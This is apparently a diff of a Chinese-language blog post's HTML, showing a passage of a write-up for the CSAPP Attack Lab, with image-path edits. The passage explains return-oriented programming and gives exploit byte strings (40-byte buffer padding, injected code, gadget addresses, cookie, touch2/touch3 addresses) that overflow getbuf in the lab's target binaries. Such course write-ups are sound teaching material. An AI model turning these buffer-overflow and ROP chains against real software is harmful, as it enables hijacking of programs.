 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//用合适语句及00填充40字节</span></span><br><span class="line"><span class="number">48</span> c7 c7 a8 dc <span class="number">61</span> <span class="number">55</span> <span class="number">68</span> fa <span class="number">18</span></span><br><span class="line"><span class="number">40</span> <span class="number">00</span> c3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="comment">//讲getbuf缓存起始地址填入返回地址中</span></span><br><span class="line"><span class="number">78</span> dc <span class="number">61</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="comment">//十六进制串</span></span><br><span class="line"><span class="number">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>
 
 <p>可以看到成功PASS：</p>
-<p><img src="/.com//Users\余新宇\AppData\Roaming\Typora\typora-user-images\image-20220707170244255.png" alt="image-20220707170244255"></p>
+<p><img src="/2022/07/11/CSAPP-Lab3-Attack-Lab/16.jpg"></p>
 <h3 id="ROP-Return-Oriented-Programming-攻击"><a href="#ROP-Return-Oriented-Programming-攻击" class="headerlink" title="ROP(Return-Oriented Programming)攻击"></a>ROP(Return-Oriented Programming)攻击</h3><p>首先明确代码注入攻击的重点在于缓存区的代码可以被执行而且栈的位置不随机，所以可以确定每次跳转的地址，然后运行缓存区内的代码，从而执行一些注入的程序。</p>
 <p>但是rtarget中针对上述，有以下两个特点防止代码注入攻击：</p>
 <ol>
@@ -390,8 +389,7 @@
 </ol>
 <p>所以需要新的攻击方案：执行的代码在原来程序中已经有，但是在不同的位置，需要拼凑甚至“断章取义”汇编代码得到。</p>
 <p>总的逻辑示意：</p>
-<img src="https://wdxtub.com/images/csapp/14554587074206.jpg" alt="img" style="zoom:80%;">
-
+<p><img src="/2022/07/11/CSAPP-Lab3-Attack-Lab/17.jpg"></p>
 <p>最开始执行rsp中的gadget1，此时rsp+&#x3D;0x8指向gadget2，然后ret(汇编代码c3)，开始执行gadget2，rsp指向gadget3……</p>
 <p>所以我们可以将getbuf函数的缓存区存满之后一次性存入指向已有程序位置的代码执行攻击。</p>
 <h4 id="level-2-1"><a href="#level-2-1" class="headerlink" title="level 2"></a>level 2</h4><p><strong>基本思路</strong>：这一部分要求完成代码注入攻击level 2同等内容的攻击。level 2中攻击需要传入参数cookie(0x59b997fa)，然后调用函数touch2。</p>
@@ -408,12 +406,12 @@
 
 <p>可以得到语句movq %rax, %rdi，起始地址0x4019a2</p>
 <p>所以根据思路分析得出的栈中内容：</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/1433829-45d42fcf3d5bcca4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/568/format/webp" alt="img"></p>
+<p><img src="/2022/07/11/CSAPP-Lab3-Attack-Lab/18.jpg"></p>
 <p>答案如下：</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//40字节填充</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">ab <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="comment">//popq %rax起始地址（gadget1）</span></span><br><span class="line">fa <span class="number">97</span> b9 <span class="number">59</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="comment">//cookie</span></span><br><span class="line">a2 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="comment">//movq %rax %rdi起始地址（gadget2）</span></span><br><span class="line">ec <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="comment">//touch2起始地址</span></span><br></pre></td></tr></table></figure>
 
 <p>运行结果，成功PASS：</p>
-<p><img src="/.com//Users\余新宇\AppData\Roaming\Typora\typora-user-images\image-20220707213503552.png" alt="image-20220707213503552"></p>
+<p><img src="/2022/07/11/CSAPP-Lab3-Attack-Lab/19.jpg"></p>
 <h4 id="level-3-1"><a href="#level-3-1" class="headerlink" title="level 3"></a>level 3</h4><p><strong>基本思路</strong>：根据ctarget中的level 3可以知道，需要将一个字符串转化后的十六进制序列存在一个地址中，然后把这个地址作为参数传给%rdi，再调用touch3函数。</p>
 <p>所以核心逻辑语句（不一定能找到刚好的，但是最终目的）：</p>
 <ol>
@@ -456,14 +454,13 @@
 
 <p>代码48 89 e0表示movq %rsp,%rdi，起始地址0x401a06，将寄存器目前栈顶存入%rax，因此可以完成目的。</p>
 <p>因此仍然利用数组溢出进行语句填充，先用40个00填充getbuf，然后按照8-7-6-偏移量-5-4-3-2-1-touch3-字符串的顺序填充，如下图所示。</p>
-<img src="https://upload-images.jianshu.io/upload_images/1433829-cafcf76d35ef7ba1.png?imageMogr2/auto-orient/strip|imageView2/2/w/562/format/webp" alt="img">
-
+<p><img src="/2022/07/11/CSAPP-Lab3-Attack-Lab/20.jpg"></p>
 <p>由于要执行movq %rsp,%rax语句的时候%rsp实际指向的movq %rax,%rdi这一条语句，所以存入的是原返回地址（图示）的+0x8的位置。字符串转化的序列存在touch3之后，所以可以看到存入的地址+9条语句空间&#x3D;字符串起始地址，所以popq语句之后的偏移量应该存72，即0x48。字符串根据同代码注入攻击中的35 39 62 39 39 37 66 61 00。</p>
 <p>因此答案如下：</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//填充40字节</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">06</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">//8</span></span><br><span class="line">a2 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">//7</span></span><br><span class="line">cc <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">//6</span></span><br><span class="line"><span class="number">48</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">//偏移量</span></span><br><span class="line">dd <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">//5</span></span><br><span class="line"><span class="number">70</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">//4</span></span><br><span class="line"><span class="number">13</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">//3</span></span><br><span class="line">d6 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">//2</span></span><br><span class="line">a2 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">//1</span></span><br><span class="line">fa <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="comment">//touch3</span></span><br><span class="line"><span class="number">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span> <span class="number">00</span> <span class="comment">//字符串</span></span><br></pre></td></tr></table></figure>
 
 <p>成功通过：</p>
-<p><img src="/.com//Users\余新宇\AppData\Roaming\Typora\typora-user-images\image-20220708110212930.png" alt="image-20220708110212930"></p>
+<p><img src="/2022/07/11/CSAPP-Lab3-Attack-Lab/21.jpg"></p>
 
     </div>
 
@@ -485,9 +482,6 @@
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2022/07/11/test/" rel="next" title="test">
-                  test <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
